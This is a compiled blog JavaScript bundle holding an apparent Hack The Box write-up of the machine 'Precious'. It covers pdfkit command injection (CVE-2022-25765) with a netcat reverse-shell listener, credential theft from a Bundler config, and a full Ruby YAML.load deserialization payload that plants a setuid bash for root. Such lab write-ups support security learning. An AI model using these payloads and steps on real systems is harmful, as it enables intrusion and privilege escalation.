"use strict";(self.webpackChunkmy_blog=self.webpackChunkmy_blog||[]).push([[464],{219:(e,t,n)=>{n.d(t,{A:()=>a});const a=n.p+"assets/images/image-pr-24-a42e425b826d4b8e17820f2718f332c7.png"},308:(e,t,n)=>{n.d(t,{A:()=>a});const a=n.p+"assets/images/image-pr-23-6c6579380afab0d389ca60168220cd88.png"},534:(e,t,n)=>{n.d(t,{A:()=>a});const a=n.p+"assets/images/image-pr-18-fe1ad720eba7d8ce6918e47caa16cf62.png"},835:(e,t,n)=>{n.d(t,{A:()=>a});const a=n.p+"assets/images/image-pr-15-3865e1fe2f0063cab8d35077043f970a.png"},3341:(e,t,n)=>{n.d(t,{A:()=>a});const a=n.p+"assets/images/image-pr-22-8d83a0c85f828786739c0f1a6ecce687.png"},3619:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>s,default:()=>h,frontMatter:()=>r,metadata:()=>o,toc:()=>d});var a=n(8168),i=(n(6540),n(5680));const r={},s=void 0,o={permalink:"/Blog/blog/Precious",editUrl:"https://github.com/danae-pan/Blog/blog/Precious.md",source:"@site/blog/Precious.md",title:"Precious",description:"Task 1",date:"2025-05-22T08:22:22.339Z",formattedDate:"May 22, 2025",tags:[],readingTime:3.585,truncated:!1,authors:[],nextItem:{title:"Writeup",permalink:"/Blog/blog/Writeup"}},l={authorsImageUrls:[]},d=[{value:"Task 1",id:"task-1",children:[]},{value:"Task 2",id:"task-2",children:[]},{value:"Task 3",id:"task-3",children:[]},{value:"Task 4",id:"task-4",children:[]},{value:"Task 5",id:"task-5",children:[]},{value:"Task 6",id:"task-6",children:[]},{value:"Task 7",id:"task-7",children:[]},{value:"Task 8",id:"task-8",children:[]},{value:"Task 9",id:"task-9",children:[]}],p={toc:d},g="wrapper";function h(e){let{components:t,...r}=e;return(0,i.yg)(g,(0,a.A)({},p,r,{components:t,mdxType:"MDXLayout"}),(0,i.yg)("h3",{id:"task-1"},"Task 1"),(0,i.yg)("p",null,"Nginx is running with what additional software designed to serve web applications?"),(0,i.yg)("p",null,"Navigating to the target IP address we are being redirected to the domain ",(0,i.yg)("inlineCode",{parentName:"p"},"precious.htb"),". We then add it to the hosts file ",(0,i.yg)("inlineCode",{parentName:"p"},"vim /etc/hosts")," and reload the page."),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:n(6730).A})),(0,i.yg)("p",null,"After reloading the page, we see that the website's usage is converting web page to pdf."),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:n(835).A})),(0,i.yg)("p",null,"We then run ",(0,i.yg)("inlineCode",{parentName:"p"},"whatweb <target_url> -v")," and find that additional to nginx web server, the software running is Phusion Passenger."),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:n(3976).A})),(0,i.yg)("h3",{id:"task-2"},"Task 2"),(0,i.yg)("p",null,"Which HTTP response header reveals the underlying scripting Language of the web application?"),(0,i.yg)("p",null,"From the same response of ",(0,i.yg)("inlineCode",{parentName:"p"},"whatweb"),", we see the HTTP response header that specifies the scripting language."),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:n(7841).A})),(0,i.yg)("h3",{id:"task-3"},"Task 3"),(0,i.yg)("p",null,"Which Ruby library are the PDF documents generated with?"),(0,i.yg)("p",null,"Providing a public url to be converted, we can the error Cannot load remote URL. "),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:n(534).A})),(0,i.yg)("p",null,"Instead, we start a Python HTTP server by running ",(0,i.yg)("inlineCode",{parentName:"p"},"python3 -m http.server 8080"),". Then we can provide the IP address of the host machine to be converted as ",(0,i.yg)("inlineCode",{parentName:"p"},"http://<host_ip>:8080")," and get a pdf file back."),(0,i.yg)("p",null,"Running ",(0,i.yg)("inlineCode",{parentName:"p"},"exiftool")," against the pdf file we get the information we need about the Ruby library."),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:n(3823).A})),(0,i.yg)("h3",{id:"task-4"},"Task 4"),(0,i.yg)("p",null,"Which 2022 CVE applies to that specific version of pdfkit?"),(0,i.yg)("p",null,"By a quick google search we can find the CVE ID 2022-25765 of the Command Injection vulnerability."),(0,i.yg)("h3",{id:"task-5"},"Task 5"),(0,i.yg)("p",null,"Which directory located in the running user's home directory is used by Bundler to store configuration files?"),(0,i.yg)("p",null,"Using a PoC for the CVE that can be found at ",(0,i.yg)("a",{parentName:"p",href:"https://github.com/shamo0/PDFkit-CMD-Injection"},"text"),", we start a python server again with the same command ",(0,i.yg)("inlineCode",{parentName:"p"},"python3 -m http.server 8080")," and listener on port 4444 ",(0,i.yg)("inlineCode",{parentName:"p"},"nc -lvnp 4444"),". Then we send the curl exploit and we are connected on the target machine. "),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:n(4799).A})),(0,i.yg)("p",null,"Moving to rubycd home directory and running ",(0,i.yg)("inlineCode",{parentName:"p"},"ls -a")," to list the directories, including the hidden ones, we see the .bundle file that contains the configuration files."),(0,i.yg)("h3",{id:"task-6"},"Task 6"),(0,i.yg)("p",null,"Sumbit the flag located in the henry user's home directory."),(0,i.yg)("p",null,"Inside the .bundle directory we open the config file and get the credentials for the user henry."),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:n(3341).A})),(0,i.yg)("p",null,"Then, we switch to the henry user by running ",(0,i.yg)("inlineCode",{parentName:"p"},"su - henry")," and provide the password from before. Running ",(0,i.yg)("inlineCode",{parentName:"p"},"whoami")," shows us that we are now user henry."),(0,i.yg)("p",null,"After navigating to the henry user's home directory and running ",(0,i.yg)("inlineCode",{parentName:"p"},"cat user.txt")," we get the user flag."),(0,i.yg)("h3",{id:"task-7"},"Task 7"),(0,i.yg)("p",null,"Which command can henry run with sudo, without providing a password?"),(0,i.yg)("p",null,"We are now gonna run the ",(0,i.yg)("inlineCode",{parentName:"p"},"LinEnum.sh")," script to enumerate the host. For that purpose, we first get the script on our host machine and then open a Python server on port 8888 on the directory the script is at. Then, on the target machine we run ",(0,i.yg)("inlineCode",{parentName:"p"},"wget http://<host_ip>:8888/LinEnum.sh"),". Looking through the result we see that the user henry can sudo the command ",(0,i.yg)("inlineCode",{parentName:"p"},"/usr/bin/ruby /opt/update_dependencies.rb"),"."),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:n(308).A})),(0,i.yg)("h3",{id:"task-8"},"Task 8"),(0,i.yg)("p",null,"Which is the name of the file that allows for user-controlled input to the update_dependencies.rb script?"),(0,i.yg)("p",null,"Opening the file by ",(0,i.yg)("inlineCode",{parentName:"p"}," cat /opt/update_dependencies.rb")," we see that the file used is ",(0,i.yg)("inlineCode",{parentName:"p"},"dependencies.yml"),"."),(0,i.yg)("p",null,(0,i.yg)("img",{alt:"alt text",src:n(219).A})),(0,i.yg)("h3",{id:"task-9"},"Task 9"),(0,i.yg)("p",null,"Submit the flag located in root's home directory."),(0,i.yg)("p",null,"First, we inspect the file ",(0,i.yg)("inlineCode",{parentName:"p"},"update_dependencies.rb")," and see that there is an unsafe load of the file that allows for user-controlled input."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre"},'def list_from_file\n    YAML.load(File.read("dependencies.yml"))\nend\n')),(0,i.yg)("p",null,"The ",(0,i.yg)("inlineCode",{parentName:"p"},"YAML.load()")," deserializes YAML into Ruby objects in an insecure way that can lead to arbitary code execution. Based on this gist ",(0,i.yg)("a",{parentName:"p",href:"https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml"},"text")," we craft the following payload and we place it in the henry's home directory."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre"},"\ncat << 'EOF' > dependencies.yml\n--- \n- !ruby/object:Gem::Installer\n  i: x\n- !ruby/object:Gem::SpecFetcher\n  i: y\n- !ruby/object:Gem::Requirement\n  requirements:\n    !ruby/object:Gem::Package::TarReader\n      io: &1 !ruby/object:Net::BufferedIO\n        io: &1 !ruby/object:Gem::Package::TarReader::Entry\n          read: 0\n          header: \"abc\"\n        debug_output: &1 !ruby/object:Net::WriteAdapter\n          socket: &1 !ruby/object:Gem::RequestSet\n            sets: !ruby/object:Net::WriteAdapter\n              socket: !ruby/module 'Kernel'\n              method_id: :system\n            git_set: cp /bin/bash /tmp/dani; chmod +6777 /tmp/dani\n          method_id: :resolve\nEOF\n")),(0,i.yg)("p",null,"We run the script as root ",(0,i.yg)("inlineCode",{parentName:"p"},"sudo /usr/bin/ruby /opt/update_dependencies.rb")," that is possible without providing password and then use the command ",(0,i.yg)("inlineCode",{parentName:"p"},"/tmp/dani -p")," which launches a new shell. The ",(0,i.yg)("inlineCode",{parentName:"p"},"-p")," flag tells bash to preserve the effective UID, which is 0 meaning root thanks to the setuid bit of the chmod command. Finally navigating to the ",(0,i.yg)("inlineCode",{parentName:"p"},"/root")," directory and ",(0,i.yg)("inlineCode",{parentName:"p"},"cat root.txt")," gives us the root flag."))}h.isMDXComponent=!0},3823:(e,t,n)=>{n.d(t,{A:()=>a});const a=n.p+"assets/images/image-pr-19-551c3003bf2df461320e57f04e7ff733.png"},3976:(e,t,n)=>{n.d(t,{A:()=>a});const a=n.p+"assets/images/image-pr-16-0b38cb81672bdb56d43eb0eadfe3ff7b.png"},4799:(e,t,n)=>{n.d(t,{A:()=>a});const a=n.p+"assets/images/image-pr-20-e5439a5797113a855d4301fa47b167d1.png"},6730:(e,t,n)=>{n.d(t,{A:()=>a});const a=n.p+"assets/images/image-pr-14-2e091da2a07a41b03e9f1fe21dda3673.png"},7841:(e,t,n)=>{n.d(t,{A:()=>a});const a=n.p+"assets/images/image-pr-17-fb2e51f74495059f4807943934bb6c0d.png"}}]);